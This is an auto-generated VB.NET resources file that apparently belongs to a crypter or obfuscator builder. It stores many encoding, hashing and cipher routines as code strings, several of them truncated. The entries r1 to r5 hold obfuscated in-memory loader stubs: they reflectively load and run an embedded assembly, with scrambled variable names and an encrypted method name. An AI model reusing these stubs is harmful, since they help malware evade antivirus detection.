        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''     [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property GILA7_Decode() As String
            Get
                Return ResourceManager.GetString("GILA7_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function GILA7_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;7ZSTJK+W=cVtBCasyf0gzA8uvwDEq3XH/1RMNOILPQU4klm65YbdeFrx2hij9nopG&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Next [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property GILA7_Encode() As String
            Get
                Return ResourceManager.GetString("GILA7_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function HAZZ15_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;HNO4klm6ij9n+J2hyf0gzA8uvwDEq3X1Q7ZKeFrWcVTts/MRGYbdxSo=ILaUpPBC5&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''    [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property HAZZ15_Decode() As String
            Get
                Return ResourceManager.GetString("HAZZ15_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function HAZZ15_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;HNO4klm6ij9n+J2hyf0gzA8uvwDEq3X1Q7ZKeFrWcVTts/MRGYbdxSo=ILaUpPBC5&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Nex [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property HAZZ15_Encode() As String
            Get
                Return ResourceManager.GetString("HAZZ15_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function String2Hex(ByVal input As String) As String
        '''        Dim out As New StringBuilder
        '''        For Each c As String In input
        '''            Dim temp As String = Hex(Asc(c))
        '''            out.Append(temp &amp; &quot; &quot;)
        '''        Next
        '''        Return out.ToString.Substring(0, out.Length - 1)
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property HEX_ENCRYPT() As String
            Get
                Return ResourceManager.GetString("HEX_ENCRYPT", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function HMACMD5(ByVal input As String) As String
        '''        Dim MD5 As New HMACMD5
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property HMACMD5() As String
            Get
                Return ResourceManager.GetString("HMACMD5", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to    Public Function HMACRIPEMD160(ByVal input As String) As String
        '''        Dim MD5 As New HMACRIPEMD160
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''    E [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property HMACRIPEMD160() As String
            Get
                Return ResourceManager.GetString("HMACRIPEMD160", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function HMACSHA1(ByVal input As String) As String
        '''        Dim MD5 As New HMACSHA1
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''    End Functi [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property HMACSHA1() As String
            Get
                Return ResourceManager.GetString("HMACSHA1", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function HMACSHA256(ByVal input As String) As String
        '''        Dim MD5 As New HMACSHA256
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''    End Fu [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property HMACSHA256() As String
            Get
                Return ResourceManager.GetString("HMACSHA256", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function HMACSHA384(ByVal input As String) As String
        '''        Dim MD5 As New HMACSHA384
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''    End Fu [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property HMACSHA384() As String
            Get
                Return ResourceManager.GetString("HMACSHA384", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function HMACSHA512(ByVal input As String) As String
        '''        Dim MD5 As New HMACSHA512
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''    End Fu [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property HMACSHA512() As String
            Get
                Return ResourceManager.GetString("HMACSHA512", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function MACTripleDES(ByVal input As String) As String
        '''        Dim MD5 As New MACTripleDES
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        '''    En [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property MACTripleDES() As String
            Get
                Return ResourceManager.GetString("MACTripleDES", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function MD5Decrypt(ByVal bytData As Byte(), ByVal sKey As String, Optional ByVal tMode As CipherMode = 2, Optional ByVal tPadding As PaddingMode = 2) As Byte()
        '''        Dim provider As New MD5CryptoServiceProvider
        '''        Dim buffer2 As Byte() = provider.ComputeHash(Encoding.UTF8.GetBytes(sKey))
        '''        provider.Clear()
        '''        Dim provider2 As New TripleDESCryptoServiceProvider
        '''        provider2.Key = buffer2
        '''        provider2.Mode = tMode
        '''        provider2.Padding = tPadding
        '''        Dim [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property MD5___Decrypt__() As String
            Get
                Return ResourceManager.GetString("MD5___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function Md5Encrypt(bytData As Byte(), sKey As String, Optional tMode As CipherMode = CipherMode.ECB, Optional tPadding As PaddingMode = PaddingMode.PKCS7) As Byte()
        '''        Dim mD5CryptoServiceProvider As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
        '''        Dim key As Byte() = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(sKey))
        '''        mD5CryptoServiceProvider.Clear()
        '''        Dim tripleDESCryptoServiceProvider As TripleDESCryptoServiceProvider = New TripleD [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property MD5_Encrypt() As String
            Get
                Return ResourceManager.GetString("MD5_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to    Public Function MD5Hash(ByVal input As String) As String
        '''        Dim MD5 As New MD5CryptoServiceProvider
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = MD5.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        Return Res
        ''' [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property MD5Hash() As String
            Get
                Return ResourceManager.GetString("MD5Hash", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function MEGAN35_Decode(ByVal input As String) As String
        '''        Dim key As String = &quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs() As Integer = {0, 0, 0}
        '''            For b As Integer = 0 To 3
        '''                enc(b) = key.IndexOf(input(i))
        '''                i = i + 1
        '''            Next
        '''            chrs(0) = (enc(0) &lt;&lt; 2) Or (enc(1) &gt;&gt; 4)
        '''   [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property MEGAN35_Decode() As String
            Get
                Return ResourceManager.GetString("MEGAN35_Decode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function MEGAN35_Encode(ByVal input As String) As String
        '''        input = Uri.EscapeDataString(input)
        '''        Dim key As String = &quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;
        '''        Dim out As New StringBuilder
        '''        Dim i As Integer
        '''        Do
        '''            Dim enc(3) As Integer
        '''            Dim chrs As Integer() = {0, 0, 0}
        '''            For b As Integer = 0 To 2
        '''                If i &lt; input.Length Then chrs(b) = Asc(input(i))
        '''                i += 1
        '''            Ne [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property MEGAN35_Encode() As String
            Get
                Return ResourceManager.GetString("MEGAN35_Encode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function OKTO3_Decrypt(ByVal message As String, Optional ByVal key As String = &quot;PASS:OKTO3-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 10 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''
        '''        Dim oOutString As String() = Split(message, &quot;, &quot;)
        '''        For i As Integer = 0 To oOutString.Length - 1
        '''            oOutString(i) = oOutString(i).Replace(&quot;.&quot;, &quot;,&quot;)
        '''        Next
        '''        For x As Integer = 0 T [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property OKTO3_Decrypt() As String
            Get
                Return ResourceManager.GetString("OKTO3_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function OKTO3_Encrypt(ByVal message As String, Optional ByVal key As String = &quot;PASS:OKTO3-CRYPO&quot;) As String
        '''        Dim out As New System.Text.StringBuilder
        '''        If key.Length &lt; 10 Then Return message
        '''        Dim intkey() As Byte = System.Text.Encoding.UTF8.GetBytes(key)
        '''        Dim x As Integer
        '''        Do While x &lt; message.Length
        '''            Dim hextemp As String = &quot;&quot;
        '''            Dim y As String = &quot;&quot;
        '''            If x &gt; 0 Then y = &quot;, &quot;
        '''            For i As Integer = x To Math.Round(k [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property OKTO3_Encrypt() As String
            Get
                Return ResourceManager.GetString("OKTO3_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Overloads Shared Function PolyDeCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
        '''        Dim buff() As Byte = PolyDeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
        '''        PolyDeCrypt = Encoding.Default.GetString(buff)
        '''        Erase buff
        '''    End Function
        '''    Overloads Shared Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
        '''        For i = 0  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Polymorphic_Stairs___Decrypt__() As String
            Get
                Return ResourceManager.GetString("Polymorphic_Stairs___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Overloads Shared Function PolyCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
        '''        Dim buff() As Byte = PolyCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
        '''        PolyCrypt = Encoding.Default.GetString(buff)
        '''        Erase buff
        '''    End Function
        '''    Overloads Shared Function PolyCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
        '''        Array.Resize(Data, [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Polymorphic_Stairs___Encrypt__() As String
            Get
                Return ResourceManager.GetString("Polymorphic_Stairs___Encrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function pr0t3_decrypt(ByVal message As String)
        '''        Dim decrypted As String
        '''        Dim key As Integer = 3
        '''        For Each c As Char In message
        '''            decrypted = decrypted &amp; Chr((Asc(c) - key))
        '''        Next
        '''        decrypted = StrReverse(decrypted)
        '''        Return decrypted
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property pr0t3_decrypt() As String
            Get
                Return ResourceManager.GetString("pr0t3_decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function pr0t3_encrypt(ByVal message As String)
        '''        Dim encrypted As String
        '''        Dim key As Integer = 3
        '''        message = StrReverse(message)
        '''        For Each c As Char In message
        '''            encrypted += Chr((Asc(c) + key))
        '''        Next
        '''        Return encrypted
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property pr0t3_encrypt() As String
            Get
                Return ResourceManager.GetString("pr0t3_encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim ثصعقغعهثصقتياسبتانلسيباتل As System.Object = System.AppDomain.CurrentDomain
        '''        Dim يساتبءؤىلالاىراتلثعغثصفق As Reflection.Assembly = ثصعقغعهثصقتياسبتانلسيباتل.Load(&quot;.:R4Jaw:.&quot;)
        '''        يساتبءؤىلالاىراتلثعغثصفق.EntryPoint.Invoke(&quot;ثقثصعهقهعصثغقهعيسابلاتلرلاؤىؤءراتيسبتالثصسغعصثق&quot;, Nothing).
        '''</summary>
        Friend ReadOnly Property r1() As String
            Get
                Return ResourceManager.GetString("r1", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim Utuyezteuzyrhjg As System.Object = System.Reflection.Assembly.Load(&quot;R4Jaw!&quot;)
        '''        Dim UtuyezteuzyrhjgUtuyezteuzyrhjg As Object = Utuyezteuzyrhjg.EntryPoint
        '''        UtuyezteuzyrhjgUtuyezteuzyrhjg.EntryPoint.Invoke(&quot;zteuzyrhjgUtuy8598965&quot;, Nothing).
        '''</summary>
        Friend ReadOnly Property r2() As String
            Get
                Return ResourceManager.GetString("r2", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim 日本国日本国日本国 As Object = AppDomain.CurrentDomain.Load(&quot;R4Jaw!&quot;).EntryPoint
        '''        日本国日本国日本国.Invoke(&quot;日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国日本国&quot;, Nothing).
        '''</summary>
        Friend ReadOnly Property r3() As String
            Get
                Return ResourceManager.GetString("r3", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim абвгдеёжзийклмноп As System.Object = System.Reflection.Assembly.Load(&quot;R4Jaw!&quot;)
        '''        абвгдеёжзийклмноп.EntryPoint.Invoke(Nothing, Nothing).
        '''</summary>
        Friend ReadOnly Property r4() As String
            Get
                Return ResourceManager.GetString("r4", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to         Dim r1 As String = DES_Decrypt(&quot;BghUqQpTItI=&quot;, &quot;IUYgj87987IIUYHJK7894165BNCVBVGD&quot;)
        '''
        '''        Dim r2 As Object = AppDomain.CurrentDomain
        '''
        '''        Dim rca1 As Object = CallByName(r2, r1, CallType.Method, &quot;R4Jaw!&quot;)
        '''
        '''        rca1.EntryPoint.Invoke(&quot;&quot;, Nothing)
        '''
        '''    End Sub
        '''    Public Function DES_Decrypt(ByVal input As String, ByVal pass As String) As String
        '''        Dim DES As New System.Security.Cryptography.DESCryptoServiceProvider
        '''        Dim Hash_DES As New System.Security.Cryptography.MD5 [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property r5() As String
            Get
                Return ResourceManager.GetString("r5", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function RC2Decrypt(ByVal strInput As String, ByVal strPassword As String) As String
        '''        Dim RC2 As New RC2CryptoServiceProvider
        '''        Dim HashRC2 As New MD5CryptoServiceProvider
        '''        Dim strDecrypted As String = &quot;&quot;
        '''        Try
        '''            Dim Hash() As Byte = HashRC2.ComputeHash(Encoding.ASCII.GetBytes(strPassword))
        '''            RC2.Key = Hash
        '''            RC2.Mode = CipherMode.ECB
        '''            Dim DESDecrypter As ICryptoTransform = RC2.CreateDecryptor
        '''            Dim Buffer As By [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RC2___Decrypt__() As String
            Get
                Return ResourceManager.GetString("RC2___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Public Function RC2Encrypt(ByVal strInput As String, ByVal strPassword As String) As String
        '''        Dim RC2 As New RC2CryptoServiceProvider
        '''        Dim HashRC2 As New MD5CryptoServiceProvider
        '''        Dim strEncrypted As String = &quot;&quot;
        '''        Try
        '''            Dim Hash() As Byte = HashRC2.ComputeHash(Encoding.ASCII.GetBytes(strPassword))
        '''
        '''            RC2.Key = Hash
        '''            RC2.Mode = CipherMode.ECB
        '''            Dim DESEncrypter As ICryptoTransform = RC2.CreateEncryptor
        '''            Dim Buffer As Byt [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RC2Encrypt() As String
            Get
                Return ResourceManager.GetString("RC2Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function RC4decrypt(ByVal D1 As Byte(), ByVal D2 As String) As Byte()
        '''        Dim D3 As Byte() = System.Text.Encoding.ASCII.GetBytes(D2)
        '''        Dim D4, D5, D6 As UInteger
        '''        Dim D7 As UInteger() = New UInteger(255) {}
        '''        Dim D8 As Byte() = New Byte(D1.Length - 1) {}
        '''        For D4 = 0 To 255
        '''            D7(D4) = D4
        '''        Next
        '''        For D4 = 0 To 255
        '''            D5 = (D5 + D3(D4 Mod D3.Length) + D7(D4)) And 255
        '''            D6 = D7(D4)
        '''            D7(D4) = D7(D5)
        '''         [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RC4___Decrypt__() As String
            Get
                Return ResourceManager.GetString("RC4___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Public Shared Function rc4(ByVal message As String, ByVal password As String) As String
        '''        Dim i As Integer = 0
        '''        Dim j As Integer = 0
        '''        Dim cipher As New StringBuilder
        '''        Dim returnCipher As String = String.Empty
        '''        Dim sbox As Integer() = New Integer(256) {}
        '''        Dim key As Integer() = New Integer(256) {}
        '''        Dim intLength As Integer = password.Length
        '''        Dim a As Integer = 0
        '''        While a &lt;= 255
        '''            Dim ctmp As Char = (password.Substring((a Mod i [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RC4_ENCRYPT() As String
            Get
                Return ResourceManager.GetString("RC4_ENCRYPT", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function RijndaelDecrypt(ByVal UDecryptU As String, ByVal UKeyU As String)
        '''        Dim XoAesProviderX As New RijndaelManaged
        '''        Dim XbtCipherX() As Byte
        '''        Dim XbtSaltX() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        '''        Dim XoKeyGeneratorX As New Rfc2898DeriveBytes(UKeyU, XbtSaltX)
        '''        XoAesProviderX.Key = XoKeyGeneratorX.GetBytes(XoAesProviderX.Key.Length)
        '''        XoAesProviderX.IV = XoKeyGeneratorX.GetBytes(XoAesProviderX.IV.Length)
        '''        Dim XmsX As New IO.Me [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Rijndael___Decrypt__() As String
            Get
                Return ResourceManager.GetString("Rijndael___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function Rijndaelcrypt(ByVal File As String, ByVal Key As String)
        '''        Dim oAesProvider As New RijndaelManaged
        '''        Dim btClear() As Byte
        '''        Dim btSalt() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        '''        Dim oKeyGenerator As New Rfc2898DeriveBytes(Key, btSalt)
        '''        oAesProvider.Key = oKeyGenerator.GetBytes(oAesProvider.Key.Length)
        '''        oAesProvider.IV = oKeyGenerator.GetBytes(oAesProvider.IV.Length)
        '''        Dim ms As New IO.MemoryStream
        '''        Dim cs As New Cr [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Rijndaelcrypt() As String
            Get
                Return ResourceManager.GetString("Rijndaelcrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function RIPEMD160Hash(ByVal input As String) As String
        '''        Dim RIPEMD160 As New RIPEMD160Managed
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = RIPEMD160.ComputeHash(Data)
        '''        For i As Integer = 0 To Result.Length - 1
        '''            Tmp = Hex(Result(i))
        '''            If Len(Tmp) = 1 Then Tmp = &quot;0&quot; &amp; Tmp
        '''            Res += Tmp
        '''        Next
        '''        R [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RIPEMD160Hash() As String
            Get
                Return ResourceManager.GetString("RIPEMD160Hash", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function Rot13(ByVal value As String) As String
        '''        Dim lowerA As Integer = Asc(&quot;a&quot;c)
        '''        Dim lowerZ As Integer = Asc(&quot;z&quot;c)
        '''        Dim lowerM As Integer = Asc(&quot;m&quot;c)
        '''        Dim upperA As Integer = Asc(&quot;A&quot;c)
        '''        Dim upperZ As Integer = Asc(&quot;Z&quot;c)
        '''        Dim upperM As Integer = Asc(&quot;M&quot;c)
        '''        Dim array As Char() = value.ToCharArray
        '''        Dim i As Integer
        '''        For i = 0 To array.Length - 1
        '''            Dim number As Integer = Asc(array(i))
        '''            If ((number &gt;= lo [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ROT__13_ENCRYPT() As String
            Get
                Return ResourceManager.GetString("ROT__13_ENCRYPT", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function RSA_Decrypt(ByVal Input As String) As String
        '''        Dim cp As New CspParameters
        '''        cp.Flags = CspProviderFlags.UseMachineKeyStore
        '''        cp.KeyContainerName = &quot;Keys&quot;
        '''        Dim RSA As New RSACryptoServiceProvider(cp)
        '''        Dim buffer As Byte() = Convert.FromBase64String(Input)
        '''        Dim decrypted As Byte() = RSA.Decrypt(buffer, True)
        '''        Return Encoding.UTF8.GetString(decrypted)
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property RSA_Decrypt() As String
            Get
                Return ResourceManager.GetString("RSA_Decrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function RSA_Encrypt(ByVal Input As String) As String
        '''        Dim cp As New CspParameters
        '''        cp.Flags = CspProviderFlags.UseMachineKeyStore
        '''        cp.KeyContainerName = &quot;Keys&quot;
        '''        Dim RSA As New RSACryptoServiceProvider(cp)
        '''
        '''        Dim buffer As Byte() = Encoding.UTF8.GetBytes(Input)
        '''        Dim encrypted As Byte() = RSA.Encrypt(buffer, True)
        '''        Return Convert.ToBase64String(encrypted)
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property RSA_Encrypt() As String
            Get
                Return ResourceManager.GetString("RSA_Encrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Public Function RSMDecrypt(ByVal Dec_t As Byte(), ByVal James As Byte()) As Byte()
        '''        Dim aeretrtyty As New Rfc2898DeriveBytes(James, New Byte(7) {}, 1)
        '''
        '''        Dim rijndaelManagedAs New RijndaelManaged
        '''        rijndaelManaged.Key = aeretrtyty.GetBytes(16)
        '''        rijndaelManaged.IV = aeretrtyty.GetBytes(16)
        '''
        '''        Dim יפםפהבםוםקעהה As Byte() = rijndaelManaged.CreateDecryptor.TransformFinalBlock(Dec_t, 0, Dec_t.Length)
        '''        Dim יפםפהבםוםקעההיפםפהבםוםקעהה(יפםפהבםוםקעהה.Length - 17) As Byt [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RSM___Decrypt__() As String
            Get
                Return ResourceManager.GetString("RSM___Decrypt__", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Public Shared Function RSMEncrypt(data As Byte(), key As Byte()) As Byte()
        '''            Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(key, New Byte(7) {}, 1)
        '''            Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
        '''            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(16)
        '''            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(16)
        '''            &apos; The following expression was wrapped in a checked-expression
        '''            Dim array As Byte() = New Byte( [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RSMEncrypt() As String
            Get
                Return ResourceManager.GetString("RSMEncrypt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Function SHA1Hash(ByVal input As String) As String
        '''        Dim SHA1 As New SHA1CryptoServiceProvider
        '''        Dim Data As Byte()
        '''        Dim Result As Byte()
        '''        Dim Res As String = &quot;&quot;
        '''        Dim Tmp As String = &quot;&quot;
        '''        Data = Encoding.ASCII.GetBytes(input)
        '''        Result = SHA1.ComputeHash(Data)
